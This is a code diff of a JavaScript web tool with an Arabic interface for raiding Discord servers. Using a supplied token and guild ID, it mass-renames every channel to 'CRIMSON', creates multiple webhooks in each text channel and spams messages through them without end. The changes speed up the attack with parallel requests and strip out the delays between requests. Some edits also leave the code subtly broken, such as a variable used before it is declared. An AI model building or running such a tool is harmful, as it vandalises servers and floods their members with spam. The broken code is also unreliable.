@@ -56,7 +56,7 @@
       <div class="input-group"><label>🆔 آيدي السيرفر (Guild ID)</label><input type="text" id="guildId" placeholder="مثال: 123456789012345678" required /></div>
       <div class="row">
         <div class="input-group half"><label>📛 اسم الويب هوك</label><input type="text" id="webhookName" value="Crimson" /></div>
-        <div class="input-group half"><label>🔢 لكل روم نصي</label><input type="number" id="webhooksPerRoom" value="3" min="1" /></div>
+        <div class="input-group half"><label>🔢 لكل روم نصي</label><input type="number" id="webhooksPerRoom" value="5" min="1" /></div>
       </div>
       <div class="row">
         <div class="input-group half"><label>📁 اسم القنوات الجديد</label><input type="text" id="newRoomName" value="CRIMSON" /></div>
@@ -106,6 +106,29 @@
       addLog('⏹️ أمر الإيقاف... سيتم إيقاف السبام فوراً', 'warn'); 
     });
 
+    // دالة مساعدة لإرسال طلبات متوازية مع التحكم في عدد الطلبات المتزامنة
+    async function parallelRequests(tasks, concurrency = 10) {
+      const results = [];
+      const executing = [];
+      for (const task of tasks) {
+        const p = task().then(result => {
+          results.push(result);
+        });
+        executing.push(p);
+        if (executing.length >= concurrency) {
+          await Promise.race(executing);
+          // نزيل المهام المنجزة من قائمة التنفيذ
+          for (let i = executing.length - 1; i >= 0; i--) {
+            if (executing[i].isSettled) {
+              executing.splice(i, 1);
+            }
+          }
+        }
+      }
+      await Promise.allSettled(executing);
+      return results;
+    }
+
     document.getElementById('discordForm').addEventListener('submit', async (e) => {
       e.preventDefault();
       stopFlag = false;
@@ -117,7 +140,7 @@
       const token = document.getElementById('token').value.trim();
       const guildId = document.getElementById('guildId').value.trim();
       const webhookName = document.getElementById('webhookName').value.trim() || 'Crimson';
-      const webhooksPerRoom = parseInt(document.getElementById('webhooksPerRoom').value) || 3;
+      const webhooksPerRoom = parseInt(document.getElementById('webhooksPerRoom').value) || 5;
       const spamMessage = document.getElementById('spamMessage').value || 'CrimsonForge 🔥';
       const newRoomName = document.getElementById('newRoomName').value.trim() || 'CRIMSON';
       const newCategoryName = document.getElementById('newCategoryName').value.trim() || 'CRIMSON-CAT';
@@ -128,7 +151,7 @@
       runBtn.disabled = true; runBtn.textContent = '⚡ جارٍ التنفيذ...';
       document.getElementById('status').textContent = '🔥 مشتعل...';
       document.getElementById('logs').innerHTML = '';
-      addLog('🚀 بدء الهجوم السريع (تغيير الكل + سبام لا نهائي)...');
+      addLog('🚀 بدء الهجوم فائق السرعة (تنفيذ متوازي)...');
 
       async function discordFetch(url, options = {}) {
         const response = await fetch(PROXY_URL, {
@@ -162,38 +185,31 @@
         if (allChannels.length === 0) { addLog('⚠️ لا توجد قنوات!', 'warn'); return; }
         addLog(`✅ تم العثور على ${allChannels.length} قناة/فئة.`);
 
-        let currentProgress = 0;
-        const totalTasks = allChannels.length + (textChannels.length * webhooksPerRoom);
-        const progressPerTask = 70 / totalTasks; // 70% للتغيير + إنشاء الويب هوكات
-
-        // 2. تغيير أسماء الكل (نصي، صوتي، فئات) بسرعة
-        for (const ch of allChannels) {
-          if (stopFlag) { addLog('⏹️ تم الإيقاف.', 'warn'); return; }
+        // 2. تغيير أسماء الكل (نصي، صوتي، فئات) بالتوازي (دفعة واحدة)
+        addLog('⚡ تغيير أسماء جميع القنوات والفئات بسرعة فائقة...');
+        const renameTasks = allChannels.map(ch => async () => {
+          if (stopFlag) return;
           try {
             let newName = newRoomName;
             if (ch.type === 4) newName = newCategoryName;
-        
             await discordFetch(`https://discord.com/api/v10/channels/${ch.id}`, {
               method: 'PATCH',
               headers: { Authorization: token, 'Content-Type': 'application/json' },
               body: JSON.stringify({ name: newName })
             });
-            const typeMap = { 0: 'نصي', 2: 'صوتي', 4: 'فئة' };
-            addLog(`✅ تغيير ${typeMap[ch.type] || ''} #${ch.name} -> ${newName}`, 'success');
-          } catch (err) { /* نتجاوز أخطاء التغيير */ }
-          currentProgress += progressPerTask; 
-          setProgress(Math.min(currentProgress, 70));
-          await delay(120);
-        }
+            // لا نسجل كل تغيير لتجنب الزحمة
+          } catch (err) { /* نتجاوز الأخطاء */ }
+        });
+        await parallelRequests(renameTasks, 20); // 20 طلب متوازي
+        addLog('✅ تم تغيير أسماء جميع القنوات والفئات!', 'success');
+        setProgress(30);
 
-        // 3. إنشاء ويب هوكات في كل القنوات النصية (بالتوازي / دفعة واحدة) عشان السرعة!!
-        const allUrls = [];
+        // 3. إنشاء ويب هوكات بالتوازي (دفعة واحدة)
+        addLog('⚡ إنشاء ويب هوكات في جميع القنوات النصية بسرعة فائقة...');
         const webhookPromises = [];
-
         for (const ch of textChannels) {
           for (let i = 0; i < webhooksPerRoom; i++) {
             if (stopFlag) break;
-            // نضع كل طلب في Promise وننفذها كلها مع بعض
             const promise = discordFetch(`https://discord.com/api/v10/channels/${ch.id}/webhooks`, {
               method: 'POST',
               headers: { Authorization: token, 'Content-Type': 'application/json' },
@@ -204,28 +220,24 @@
               allUrls.push(url);
               stats.webhooks++; 
               updateStats();
-              addLog(`✅ ويب هوك في #${ch.name}`, 'success');
             })
-            .catch(err => {
-              addLog(`❌ فشل إنشاء ويب هوك في #${ch.name}`, 'error');
-            });
+            .catch(err => { /* نتجاوز */ });
             webhookPromises.push(promise);
           }
         }
-
-        // ننتظر انتهاء جميع طلبات إنشاء الويب هوكات (تشتغل كلها مع بعض)
+        const allUrls = [];
         await Promise.allSettled(webhookPromises);
-        setProgress(99);
+        setProgress(90);
+        addLog(`✅ تم إنشاء ${allUrls.length} ويب هوك بسرعة فائقة.`, 'success');
 
         if (allUrls.length === 0) { addLog('⚠️ لم يتم إنشاء أي ويب هوك! لا يمكن السبام.', 'warn'); return; }
-        addLog(`✅ تم إنشاء ${allUrls.length} ويب هوك بسرعة فائقة.`);
-        addLog('🔥 بدء السبام اللانهائي... اضغط "إيقاف" للتوقف.', 'success');
+        addLog('🔥 بدء السبام اللانهائي فائق السرعة... اضغط "إيقاف" للتوقف.', 'success');
 
-        // 4. السبام اللانهائي (سريع جداً)
+        // 4. السبام اللانهائي مع تنفيذ متوازي (5 طلبات في نفس الوقت)
         let round = 1;
         while (!stopFlag) {
-          for (const url of allUrls) {
-            if (stopFlag) break;
+          const spamTasks = allUrls.map(url => async () => {
+            if (stopFlag) return;
             try {
               await discordFetch(url, {
                 method: 'POST',
@@ -233,19 +245,17 @@
                 body: JSON.stringify({ content: spamMessage })
               });
               stats.messages++; updateStats();
-            } catch (err) { /* نتجاوز الأخطاء */ }
-            await delay(40); // سرعة عالية
-          }
+            } catch (err) { /* نتجاوز */ }
+          });
+          // نرسل 5 رسائل متوازية في كل دفعة
+          await parallelRequests(spamTasks, 5);
           if (!stopFlag) {
-            // نحدث السجل كل جولة حتى لو ما تغير الرقم عشان يظهر انه شغال
             addLog(`📩 اكتملت الجولة ${round} (مستمر...)`, 'success');
             round++;
-            // نحرك الشريط وهمياً فوق 99% عشان يدل على النشاط
-            setProgress(99 + (Math.random() * 0.9));
+            setProgress(90 + (Math.random() * 9));
           }
         }
 
-        // عند الخروج (الضغط على إيقاف)
         setProgress(100);
         addLog('⏹️ تم إيقاف السبام اللانهائي.', 'warn');
         document.getElementById('status').textContent = '⏹️ متوقف';
